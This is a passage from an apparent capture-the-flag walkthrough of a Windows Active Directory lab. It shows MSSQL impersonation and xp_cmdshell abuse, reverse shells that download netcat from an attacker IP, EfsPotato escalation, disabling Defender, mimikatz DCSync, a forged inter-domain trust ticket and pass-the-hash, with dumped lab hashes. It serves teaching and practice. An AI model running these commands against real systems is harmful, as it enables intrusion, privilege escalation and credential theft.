        ON perm.major_id = impersonated.principal_id
    JOIN sys.server_principals AS grantor
        ON perm.grantor_principal_id = grantor.principal_id
    WHERE perm.permission_name = ''IMPERSONATE'' ');

```

It shows that bridge\_corp can impersonate sa:

![image-20250331122051333](/img/image-20250331122051333.png)

#### xp\_cmdshell POC

As sa, I can enable `xp_cmdshell` and run commands on the host. To execute on PRIMARY, I’ll use the `EXECUTE('string to be executed') AT [PRIMARY]` syntax.

If I try `EXECUTE('exec xp_cmdshell "whoami"') AT [PRIMARY]`, it returns:

> RequestError: The EXECUTE permission was denied on the object ‘xp\_cmdshell’, database ‘mssqlsystemresource’, schema ‘sys’.

I’ll add a bit to run as sa:

```

EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell "whoami"') AT [PRIMARY]

```

And another error:

> RequestError: SQL Server blocked access to procedure ‘sys.xp\_cmdshell’ of component ‘xp\_cmdshell’ because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of ‘xp\_cmdshell’ by using sp\_configure. For more information about enabling ‘xp\_cmdshell’, search for ‘xp\_cmdshell’ in SQL Server Books Online.

I’ll need to enable it:

```

EXECUTE('EXECUTE AS LOGIN=''sa''; exec sp_configure "show advanced options", 1; RECONFIGURE; exec sp_configure "xp_cmdshell", 1; reconfigure;') AT [PRIMARY]

```

Once I run that, the same command above works:

![image-20250331123219668](/img/image-20250331123219668.png)

#### Reverse Shell

My initial attempt is to just replace `whoami` with a PowerShell reverse shell:

```

EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4ANgAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"') AT [PRIMARY]

```

It fails with the message:

> RequestError: The identifier that starts with ‘powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUA’ is too long. Maximum length is 128.

I’ll upload netcat:

```

EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell "powershell -c iwr http://10.10.14.6/nc64.exe -outfile C:\programdata\nc64.exe"') AT [PRIMARY]

```

Once that works, I’ll run it:

```

EXECUTE('EXECUTE AS LOGIN=''sa''; exec xp_cmdshell "C:\programdata\nc64.exe 10.10.14.6 443 -e powershell"') AT [PRIMARY]

```

And I get a shell as the mssqlserver service on PRIMARY:

```

oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.24 49874
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
nt service\mssqlserver
PS C:\Windows\system32> hostname
PRIMARY

```

## Shell as SYSTEM on PRIMARY

### Enumeration

There’s not much of anything on the filesystem of this box, which makes sense as it is a database server.

As is typical for a database service account, the mssqlserver has `SeImpersonatePrivilege`:

```

PS C:\programdata> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

### Potato

I can try [GodPotato](https://github.com/BeichenDream/GodPotato), uploading the compiled binary to Ghost:

```

PS C:\programdata> wget http://10.10.14.6/GodPotato-NET4.exe -outfile gp.exe

```

When I try to run it, Defender eats it:

```

PS C:\programdata> .\gp.exe whoami
Program 'gp.exe' failed to run: Operation did not complete successfully because the file contains a virus or 
potentially unwanted softwareAt line:1 char:1
+ .\gp.exe whoami
+ ~~~~~~~~~~~~~~~.
At line:1 char:1
+ .\gp.exe whoami
+ ~~~~~~~~~~~~~~~
    + CategoryInfo          : ResourceUnavailable: (:) [], ApplicationFailedException
    + FullyQualifiedErrorId : NativeCommandFailed

```

I’ll pivot to [EsfPotato](https://github.com/zcgonvh/EfsPotato). I’ll upload `EfsPotato.cs` and compile it using the `csc.exe` on Ghost:

```

PS C:\programdata> wget 10.10.14.6/EfsPotato.cs -outfile EfsPotato.cs
PS C:\programdata> C:\Windows\Microsoft.net\framework\v4.0.30319\csc.exe EfsPotato.cs -nowarn:1691,618

Microsoft (R) Visual C# Compiler version 4.8.4161.0                            
for C# 5                                                                       
Copyright (C) Microsoft Corporation. All rights reserved.

This compiler is provided as part of the Microsoft (R) .NET Framework, but only supports language versions up to C# 5, which is no longer the latest version. 
For compilers that support newer versions of the C# programming language, see http://go.microsoft.com/fwlink/?LinkID=533240

```

It works:

```

PS C:\programdata> .\EfsPotato.exe 'whoami'
.\EfsPotato.exe 'whoami'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privilege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=19809ff0)
[+] Get Token: 912
[!] process with pid: 2396 created.
==============================
nt authority\system  

```

I’ll run again using `nc64.exe`:

```

PS C:\programdata> .\EfsPotato.exe '\programdata\nc64.exe 10.10.14.6 444 -e powershell'
.\EfsPotato.exe '\programdata\nc64.exe 10.10.14.6 444 -e powershell'
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privilege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=19b26f30)
[+] Get Token: 888
[!] process with pid: 4024 created.
==============================

```

It hangs, and at my `nc` there’s a shell as system:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 444
Listening on 0.0.0.0 444
Connection received on 10.10.11.24 49870
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\programdata> whoami
nt authority\system

```

## Shell as Administrator

### Enumeration

#### Domain

`systeminfo` shows that this host is a part of the `corp.ghost.htb` domain:

```

PS C:\programdata> systeminfo

Host Name:                 PRIMARY
OS Name:                   Microsoft Windows Server 2022 Datacenter
OS Version:                10.0.20348 N/A Build 20348
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Primary Domain Controller
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00454-70295-72962-AA521
Original Install Date:     1/30/2024, 7:27:30 PM
System Boot Time:          3/31/2025, 9:30:00 AM
System Manufacturer:       Microsoft Corporation
System Model:              Virtual Machine
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Microsoft Corporation Hyper-V UEFI Release v4.1, 12/3/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     981 MB
Available Physical Memory: 156 MB
Virtual Memory: Max Size:  1,635 MB
Virtual Memory: Available: 359 MB
Virtual Memory: In Use:    1,276 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    corp.ghost.htb
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Microsoft Hyper-V Network Adapter
                                 Connection Name: Ethernet
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.0.0.10
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed. 

```

It has the IP 10.0.0.10. PRIMARY is the DC for this domain:

```

PS C:\programdata> Get-ADDomainController

ComputerObjectDN           : CN=PRIMARY,OU=Domain Controllers,DC=corp,DC=ghost,DC=htb
DefaultPartition           : DC=corp,DC=ghost,DC=htb
Domain                     : corp.ghost.htb
Enabled                    : True
Forest                     : ghost.htb
HostName                   : PRIMARY.corp.ghost.htb
InvocationId               : 34c6785f-058a-4d29-82a2-8a3f118c5595
IPv4Address                : 10.0.0.10
IPv6Address                : ::1
IsGlobalCatalog            : True
IsReadOnly                 : False
LdapPort                   : 389
Name                       : PRIMARY
NTDSSettingsObjectDN       : CN=NTDS Settings,CN=PRIMARY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuratio
                             n,DC=ghost,DC=htb
OperatingSystem            : Windows Server 2022 Datacenter
OperatingSystemHotfix      : 
OperatingSystemServicePack : 
OperatingSystemVersion     : 10.0 (20348)
OperationMasterRoles       : {PDCEmulator, RIDMaster, InfrastructureMaster}
Partitions                 : {DC=DomainDnsZones,DC=corp,DC=ghost,DC=htb, DC=corp,DC=ghost,DC=htb, 
                             DC=ForestDnsZones,DC=ghost,DC=htb, CN=Schema,CN=Configuration,DC=ghost,DC=htb...}
ServerObjectDN             : CN=PRIMARY,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=ghost,DC=htb
ServerObjectGuid           : e9f296c1-3f55-473b-b8fd-d5ac6be967d7
Site                       : Default-First-Site-Name
SslPort                    : 636

```

I can check out the domain relationship further with [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1). It gets blocked by AV, but now I can just disable that:

```

PS C:\programdata> wget 10.10.14.6/PowerView.ps1 -outfile pv.ps1
wget 10.10.14.6/PowerView.ps1 -outfile pv.ps1
PS C:\programdata> . .\pv.ps1
. .\pv.ps1
. : Operation did not complete successfully because the file contains a virus or potentially unwanted software.
At line:1 char:3
+ . .\pv.ps1
+   ~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
PS C:\programdata> Set-MpPreference -DisableRealtimeMonitoring $True
PS C:\programdata> wget 10.10.14.6/PowerView.ps1 -outfile pv.ps1
PS C:\programdata> . .\pv.ps1
PS C:\programdata> Get-DomainTrust

SourceName      : corp.ghost.htb
TargetName      : ghost.htb
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST
TrustDirection  : Bidirectional
WhenCreated     : 2/1/2024 2:33:33 AM
WhenChanged     : 3/26/2025 9:35:22 PM

```

#### BloodHound

A nicer way to look at this is with Bloodhound. I’ll grab the sharphound collector from the CE webpage and upload it and run it:

```

PS C:\programdata> wget 10.10.14.6/SharpHound.exe -outfile sh.exe
PS C:\programdata> .\sh.exe -c all
2025-03-31T10:41:48.4716809-07:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound
erRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistrylGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, Us
2025-03-31T10:41:50.9716995-07:00|INFORMATION|Initializing SharpHound at 10:41 AM on 3/31/2025          
2025-03-31T10:41:51.4404234-07:00|INFORMATION|Resolved current domain to corp.ghost.htb                                
...[snip]...

```

The resulting `.zip` archive can be exfiled over `nc64.exe`.

On loading this into Bloodhound, I can see the bi-directional trust:

![image-20250331171019953](/img/image-20250331171019953.png)

Under Cypher -> Pre-built Searches there’s one called “Map domain trusts” that shows this nicely as well:

![image-20250401133020167](/img/image-20250401133020167.png)

#### Strategy

I’ll show two different ways to abuse this, first via a Forged Interdomain Trust Ticket and then with a Golden Ticket.

### Forged Interdomain Trust Ticket

#### Dump Trust Account NTLM

I’ll upload [Mimikatz](https://github.com/gentilkiwi/mimikatz) to Ghost and use it to dump the hashes for the domain:

```

PS C:\programdata> wget 10.10.14.6/mimikatz.exe -outfile m.exe
PS C:\programdata> .\m.exe 'lsadump::dcsync /all /csv' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
> https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /all /csv
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] Exporting domain 'corp.ghost.htb'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  69eb46aa347a8c68edb99be2725403ab        514
500     Administrator   41515af3ada195029708a53d941ab751        512
1000    PRIMARY$        27f92da5e3d79962020ddebc08ed7d70        532480
1103    GHOST$  ce0fc4ace6a604ba514b94b682dac57d        2080

mimikatz(commandline) # exit
Bye!

```

Because I don’t have an interactive shell, I’ll need to enter my commands in the command line. If I hadn’t already disabled Defender, I would need to do it here as well.

The interesting one here is GHOST$, which is the [interdomain trust account](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-1-the-mechanics/) that holds the secret for authenticating to the other trusted domain.

#### Craft Ticket

I’ll use `ticketer.py` on my host to crate the ticket, giving it the following options:
- `-nthash <GHOST$ NTLM>` - The hash to authenticate as the trust account.
- `-domain-sid <corp.ghost.htb SID>` - The SID for the domain that the account is valid in. I can get this from Bloodhound, or by PowerView’s `Get-DomainSid`:

  ```

  PS C:\programdata> get-domainsid corp.ghost.htb
  S-1-5-21-2034262909-2733679486-179904498

  ```
- `-domain corp.ghost.htb` - The domain which the creds are valid on.
- `-extra-sid <Enterprise Admin's Group on target domain>` - By adding the Enterprize Admins group to the ticket, that gives it admin privileges on `ghost.htb`. I can get this by getting the domain sid (Bloodhound or `Get-DomainSid`), and then adding “-519” to the end.
- `-spn krbtgt/ghost.htb` - The target service. If this is omitted, it will create a Golden Ticket (which is a ticket for krbtgt on the same domain). I need to target another domain, so I’ll give it that SPN.
- `<dummy name>` - Any dummy name to refer to myself as. The ticket will use the Enterprise Admin’s auth to get access to everything. The user doesn’t have to be real.

Because I’m not using the hash of krbtgt and I’m giving it an SPN, it’s not a Golden Ticket. But given that the target is another domain’s krbtgt, it’s very similar.

Putting that together generates a ticket:

```

oxdf@hacky$ ticketer.py -nthash ce0fc4ace6a604ba514b94b682dac57d -domain-sid S-1-5-21-2034262909-2733679486-179904498 -domain corp.ghost.htb -extra-sid S-1-5-21-4084500788-938703357-3654145966-519 -spn krbtgt/ghost.htb 0xdf 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for corp.ghost.htb/0xdf
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in 0xdf.ccache

```

The resulting ticket is for the krbtgt user on GHOST.htb:

```

oxdf@hacky$ KRB5CCNAME=0xdf.ccache klist
Ticket cache: FILE:0xdf.ccache
Default principal: 0xdf@CORP.GHOST.HTB

Valid starting       Expires              Service principal
03/31/2025 21:49:05  03/29/2035 21:49:05  krbtgt/ghost.htb@CORP.GHOST.HTB
        renew until 03/29/2035 21:49:05

```

#### Get Service Ticket

I’ll use that ticket to get a service ticket for the CIFS service (filesystem) of DC01 using `ST.py`:

```

oxdf@hacky$ KRB5CCNAME=0xdf.ccache getST.py -k -no-pass -spn cifs/dc01.ghost.htb corp.ghost.htb/0xdf@ghost.htb -debug
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[+] Impacket Library Installation Path: /home/oxdf/.local/share/pipx/venvs/impacket/lib/python3.12/site-packages/impacket
[+] Using Kerberos Cache: 0xdf.ccache
[+] Returning cached credential for KRBTGT/GHOST.HTB@CORP.GHOST.HTB
[+] Using TGT from cache
[+] Username retrieved from CCache: 0xdf
[*] Getting ST for user
[+] Trying to connect to KDC at GHOST.HTB:88
[*] Saving ticket in 0xdf@corp.ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache

```

This new ticket will provide full filesystem access on DC01.

```

oxdf@hacky$ KRB5CCNAME=0xdf@corp.ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache klist
Ticket cache: FILE:0xdf@corp.ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache
Default principal: 0xdf@CORP.GHOST.HTB

Valid starting       Expires              Service principal
03/31/2025 21:52:36  04/01/2025 07:52:36  cifs/dc01.ghost.htb@GHOST.HTB
        renew until 04/01/2025 21:50:32

```

#### Use Ticket

I can use this new ticket with `smbclient.py`:

```

oxdf@hacky$ KRB5CCNAME=0xdf@corp.ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache smbclient.py -k -no-pass 0xdf@dc01.ghost.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
Users
# use C$
# cd users\administrator\desktop
# ls
drw-rw-rw-          0  Wed Jul  3 20:28:35 2024 .
drw-rw-rw-          0  Mon Mar 31 19:28:11 2025 ..
-rw-rw-rw-        282  Wed Jul  3 17:02:03 2024 desktop.ini
-rw-rw-rw-         32  Wed Jul  3 17:02:03 2024 root.txt

```

I can also DCSync:

```

oxdf@hacky$ KRB5CCNAME=0xdf@corp.ghost.htb@cifs_dc01.ghost.htb@GHOST.HTB.ccache secretsdump.py -k -no-pass -just-dc 0xdf@dc01.ghost.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cdb17d5c14ff69e7067cffcc9e470bd:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0cdb6ae71c3824f2da2815f69485e128:::
kathryn.holland:3602:aad3b435b51404eeaad3b435b51404ee:0adf6114ba230ef8f023eca3c0d1af50:::
cassandra.shelton:3603:aad3b435b51404eeaad3b435b51404ee:96d2251e44e42816314c08b8e1f11b87:::
robert.steeves:3604:aad3b435b51404eeaad3b435b51404ee:7e2e1e1163ff3fa9304ecd8df6f726fe:::
florence.ramirez:3606:aad3b435b51404eeaad3b435b51404ee:29542931896c7e7a9fbca17b0dd8ab6a:::
justin.bradley:3607:aad3b435b51404eeaad3b435b51404ee:a2be8ec65d6b212138cb36422ed32f46:::
arthur.boyd:3608:aad3b435b51404eeaad3b435b51404ee:b5b7f0787f3c07f42958d33518ae19a5:::
beth.clark:3610:aad3b435b51404eeaad3b435b51404ee:1582f51fcd02e2e5316d497f2552bb83:::
charles.gray:3611:aad3b435b51404eeaad3b435b51404ee:d2fe7f2c7484fc550cac49836eabca3d:::
jason.taylor:3612:aad3b435b51404eeaad3b435b51404ee:0159e6bd4326812f9a6c406ea84035e6:::
intranet_principal:3614:aad3b435b51404eeaad3b435b51404ee:e9fac15124e1d927cbd71f851792b04f:::
gitea_temp_principal:3615:aad3b435b51404eeaad3b435b51404ee:2058fa4502750fa5d7ebd874b1ea43a1:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6c3d61860f92e30e8e9744ac5d9783b:::
LINUX-DEV-WS01$:3630:aad3b435b51404eeaad3b435b51404ee:a0e212a7a89bd8446a7c9f9314069b36:::
adfs_gmsa$:4101:aad3b435b51404eeaad3b435b51404ee:9de4d086a1443bef82340604766d69c9:::
GHOST-CORP$:2101:aad3b435b51404eeaad3b435b51404ee:cba705c3a0ee382641879159d695dff2:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:83d3226d3b2b12e89df0470c2c245fec1de69ee73195d907ed49c125a925ee76
Administrator:aes128-cts-hmac-sha1-96:44ca6c3d49fe2089d5dc5fe4f4a9f8cb
Administrator:des-cbc-md5:9de66dcbcbf8ae92
krbtgt:aes256-cts-hmac-sha1-96:2d753565cb0e7c60787b71b64a2bb6c7ec4aad554f520782c00dedd9f8efd51a
krbtgt:aes128-cts-hmac-sha1-96:a37d74f126e6f7da7f916b90403f4c73
krbtgt:des-cbc-md5:4f4cea5134df672a
kathryn.holland:aes256-cts-hmac-sha1-96:bb344e4276a9bec1137ed98d0848711cf7501c611ff50e39fb64e6238ebe9670
kathryn.holland:aes128-cts-hmac-sha1-96:af3b44ab8de1546bad51aa67bedf737b
kathryn.holland:des-cbc-md5:9b0b1c32fbe5d601
cassandra.shelton:aes256-cts-hmac-sha1-96:d2e2d7d2b410a77f0b89697f11f48009fb3ad3339f5e8e9588ecd4cb8b6c2a80
cassandra.shelton:aes128-cts-hmac-sha1-96:85d10b93011d9bf916c62301824d6c01
cassandra.shelton:des-cbc-md5:ba16fda8df52f297
robert.steeves:aes256-cts-hmac-sha1-96:21fa7d9b64f2858c8db1d3314ba8bb134677f9033fccfeaa88546d4f97d83c6c
robert.steeves:aes128-cts-hmac-sha1-96:67975e221fe0a0cebaf0add64a875433
robert.steeves:des-cbc-md5:c13e9ba2705bd398
florence.ramirez:aes256-cts-hmac-sha1-96:1289980d0bec171109ec640219279874334bebd1318aa072b5e7f3428dad198e
florence.ramirez:aes128-cts-hmac-sha1-96:1d3c8a95037580f3b7be57929a7ab177
florence.ramirez:des-cbc-md5:4ac83285ce5b2c0e
justin.bradley:aes256-cts-hmac-sha1-96:80714d87657f38e85c81742e1a68043d5d2f5cc68fd997555762e1a9d92b77ba
justin.bradley:aes128-cts-hmac-sha1-96:ea24795394bb6fadfb29277fd3c2630a
justin.bradley:des-cbc-md5:08156d73d31f6b4a
arthur.boyd:aes256-cts-hmac-sha1-96:01b137754a7664fc6f3dd4a735ae57c963172fc66a3983fff10a3ac7bca810e7
arthur.boyd:aes128-cts-hmac-sha1-96:b0e21a76869a6ef61a2934f047991bca
arthur.boyd:des-cbc-md5:cb644f519edf8079
beth.clark:aes256-cts-hmac-sha1-96:2666f06d2c1cc776aa5f36319a829491036ddd3faf31b91b4a54c759797ca13c
beth.clark:aes128-cts-hmac-sha1-96:f85a08977f96b9a785e537d67c161b12
beth.clark:des-cbc-md5:f732ef156ecd38d3
charles.gray:aes256-cts-hmac-sha1-96:66f1ac768fbdd2dc8ce5b1db31a07db6b194043ade26ebe8410b49d082498963
charles.gray:aes128-cts-hmac-sha1-96:3decbd0ea7a41bfc3faf31d6ba41631f
charles.gray:des-cbc-md5:f4345b029767bc54
jason.taylor:aes256-cts-hmac-sha1-96:94bc50eff4ee4c008f4db64836d5bf516dd6ac638927ec26029b4d9c053368b3
jason.taylor:aes128-cts-hmac-sha1-96:fc5ccdf9e506010c2942bb98f35fce08
jason.taylor:des-cbc-md5:d668133bb33446bc
intranet_principal:aes256-cts-hmac-sha1-96:e4789461db237d0162bfa21a9baeadbe69a25df7e81fc3fbc538a85396ff64e0
intranet_principal:aes128-cts-hmac-sha1-96:327d1bcbc2e684cfdf5884b79c8e2dff
intranet_principal:des-cbc-md5:d9aba74057435ef2
gitea_temp_principal:aes256-cts-hmac-sha1-96:351c63c5870d212b7a3feac31b6a80e6fb55036ead4da737177597a42939c249
gitea_temp_principal:aes128-cts-hmac-sha1-96:d70cc894c2388dd4c3b67731dafcf733
gitea_temp_principal:des-cbc-md5:512338250b8c4fd0
DC01$:aes256-cts-hmac-sha1-96:15052f0a46c62d5a1eea1dc98ce9367f2aeb1e4328f14aa1b86d3a6b760f07ba
DC01$:aes128-cts-hmac-sha1-96:462f64af96c7b965cc508d26679ee09c
DC01$:des-cbc-md5:c82646c8c791ae70
LINUX-DEV-WS01$:aes256-cts-hmac-sha1-96:b186c34ba11dbf2fb3a7d4c8f95d0d11d1be02a7a396fbf148ee5b210c70046a
LINUX-DEV-WS01$:aes128-cts-hmac-sha1-96:4b1245d19d169c5917250ab5f468b114
LINUX-DEV-WS01$:des-cbc-md5:79a8d6b0e5ef98e0
adfs_gmsa$:aes256-cts-hmac-sha1-96:37d4e8c9d1d792d8edd17f23e4c7a5be1ba40391dc5e08cdf54d317ac82bc053
adfs_gmsa$:aes128-cts-hmac-sha1-96:aa936958b4d6dacbde6677ac4e917395
adfs_gmsa$:des-cbc-md5:16159832fb9d3bb3
GHOST-CORP$:aes256-cts-hmac-sha1-96:6d6b95808a4bf395d3773db1cb467cf5348b6f07427897caaac671dc3fd9a8b0
GHOST-CORP$:aes128-cts-hmac-sha1-96:2ab8b586926fb8a457a2cb0fa72a26ab
GHOST-CORP$:des-cbc-md5:89e037e56b5bb0a8
[*] Cleaning up...

```

I’ll note the GHOST-CORP$ Trust Account on this DC. I can use the Administrator hash to get a shell:

```

oxdf@hacky$ evil-winrm -i dc01.ghost.htb -u administrator -H 1cdb17d5c14ff69e7067cffcc9e470bd
                                        
Evil-WinRM shell v3.5
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```

And the flag:

```
*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
ad8eb0da************************

```

### Golden Ticket

#### Get krbtgt NTLM

I’ll use [Mimikatz](https://github.com/gentilkiwi/mimikatz) to get the information for the krbtgt account:

```

PS C:\programdata> .\m.exe 'lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' exit
.\m.exe 'lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' exit

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(commandline) # lsadump::dcsync /user:CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb
[DC] 'corp.ghost.htb' will be the domain
[DC] 'PRIMARY.corp.ghost.htb' will be the DC server
[DC] 'CN=krbtgt,CN=Users,DC=corp,DC=ghost,DC=htb' will be the user account
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : krbtgt
** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 1/31/2024 7:34:01 PM
Object Security ID   : S-1-5-21-2034262909-2733679486-179904498-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: 69eb46aa347a8c68edb99be2725403ab
